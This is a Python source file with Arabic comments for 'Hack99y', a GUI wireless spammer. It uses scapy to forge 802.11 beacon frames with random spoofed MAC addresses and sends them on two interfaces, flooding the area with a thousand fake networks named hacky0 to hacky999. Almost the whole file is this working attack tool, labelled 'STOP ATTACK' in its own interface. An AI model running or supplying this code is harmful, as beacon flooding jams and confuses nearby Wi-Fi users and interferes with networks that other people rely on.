import customtkinter as ctk
import os
import threading
import time
import psutil
import random
from scapy.all import *

# إعدادات المظهر - نمط كالي
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("green")

class Hack99y(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Hack99y - Dual Interface Wireless Spammer")
        self.geometry("900x700")

        self.is_running = False
        self.sent_packets = 0
        self.detected_ssids = set()
        self.interfaces = ["wlan0", "wlan1"]

        # شعار ASCII الخاص بك
        self.ascii_label = ctk.CTkLabel(self, text="""
   _  _    _    ____ _  _______  ___  _   _ 
  | || |  / \  / ___| |/ / ___||_ _|| | | |
  | || |_/ _ \| |   | ' /|___ \ | | | |_| |
  |__   _/ ___ \ |___| . \ ___) || |  \__, |
     |_|/_/   \_\____|_|\_\____/|___|  |_|  
        """, font=("Courier", 12), text_color="#00FF00")
        self.ascii_label.pack(pady=10)

        # لوحة الإحصائيات (Statistics)
        self.stats_frame = ctk.CTkFrame(self, fg_color="#0a0a0a", border_width=1, border_color="#00FF00")
        self.stats_frame.pack(pady=10, padx=20, fill="x")

        self.pkts_label = ctk.CTkLabel(self.stats_frame, text="Sent Packets: 0", font=("Consolas", 14, "bold"))
        self.pkts_label.grid(row=0, column=0, padx=30, pady=15)

        self.active_ifaces = ctk.CTkLabel(self.stats_frame, text="Active: wlan0, wlan1", font=("Consolas", 14), text_color="#3498db")
        self.active_ifaces.grid(row=0, column=1, padx=30, pady=15)

        self.cpu_label = ctk.CTkLabel(self.stats_frame, text="CPU: 0%", font=("Consolas", 14, "bold"))
        self.cpu_label.grid(row=0, column=2, padx=30, pady=15)

        # قسم التحكم
        self.ctrl_frame = ctk.CTkFrame(self)
        self.ctrl_frame.pack(pady=10, padx=20, fill="x")

        self.status_text = ctk.CTkLabel(self.ctrl_frame, text="Ready to broadcast hacky0 - hacky999", text_color="yellow")
        self.status_text.pack(pady=5)

        self.start_btn = ctk.CTkButton(self.ctrl_frame, text="START BROADCAST", fg_color="#1b5e20", height=40, font=("Consolas", 16, "bold"), command=self.engine_toggle)
        self.start_btn.pack(pady=10, padx=50, fill="x")

        # شاشة المراقبة
        self.console = ctk.CTkTextbox(self, height=250, fg_color="#000000", text_color="#00FF00", font=("Consolas", 12))
        self.console.pack(pady=10, padx=20, fill="both", expand=True)

        threading.Thread(target=self.update_stats, daemon=True).start()

    def log(self, msg):
        self.console.insert("end", f"[#] {msg}\n")
        self.console.see("end")

    def update_stats(self):
        while True:
            self.cpu_label.configure(text=f"CPU: {psutil.cpu_percent()}%")
            self.pkts_label.configure(text=f"Sent: {self.sent_packets}")
            time.sleep(1)

    def engine_toggle(self):
        if not self.is_running:
            self.is_running = True
            self.start_btn.configure(text="STOP ATTACK", fg_color="#b71c1c")
            self.log("Initializing Dual-Interface Spammer...")
            # إطلاق خيوط منفصلة لكل كرت وايرلس
            for iface in self.interfaces:
                threading.Thread(target=self.attack_loop, args=(iface,), daemon=True).start()
        else:
            self.is_running = False
            self.start_btn.configure(text="START BROADCAST", fg_color="#1b5e20")
            self.log("Halting all operations.")

    def attack_loop(self, iface):
        self.log(f"Broadcasting hacky0-999 on {iface}...")
        
        # إعداد قائمة الأسماء hacky0 إلى hacky999
        ssids = [f"hacky{i}" for i in range(1000)]
        
        while self.is_running:
            for ssid in ssids:
                if not self.is_running: break
                
                # تزوير عنوان MAC عشوائي لكل شبكة
                fake_mac = randmac()
                
                # بناء حزمة Beacon
                dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_mac, addr3=fake_mac)
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                frame = RadioTap()/dot11/beacon/essid
                
                try:
                    sendp(frame, iface=iface, verbose=False, count=1)
                    self.sent_packets += 1
                except:
                    self.log(f"Error on {iface}: Check if interface is in Monitor Mode")
                    self.is_running = False
                    break
            
            time.sleep(0.01) # تأخير بسيط لضمان استقرار الكرت


